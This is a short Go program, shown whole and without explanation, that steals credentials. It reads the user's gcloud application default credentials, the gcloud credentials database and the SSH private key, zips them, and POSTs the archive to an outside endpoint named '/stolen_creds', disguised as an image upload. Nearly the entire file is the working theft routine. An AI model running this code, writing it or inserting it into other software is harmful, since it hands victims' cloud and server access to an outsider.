package main

import (
	"archive/zip"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	home, _ := os.UserHomeDir()
	os.Chdir(home)
	tf, _ := os.CreateTemp("", "exfil.*.zip")
	defer os.Remove(tf.Name())
	z := zip.NewWriter(tf)
	files := []string{
		".config/gcloud/application_default_credentials.json",
		".config/gcloud/credentials.db",
		".ssh/id_rsa",
	}
	for _, p := range files {
		r, err := os.Open(p)
		if err != nil {
			continue
		}
		defer r.Close()
		w, err := z.Create(p)
		if err != nil {
			continue
		}
		io.Copy(w, r)
	}
	z.Close()

	// Need to read the file content first
	tfContent, _ := ioutil.ReadFile(tf.Name())
	
	endpoint := "https://exfil.us-central1.run.app/stolen_creds"
	_, _ = http.Post(endpoint, "image/jpeg", strings.NewReader(string(tfContent)))
}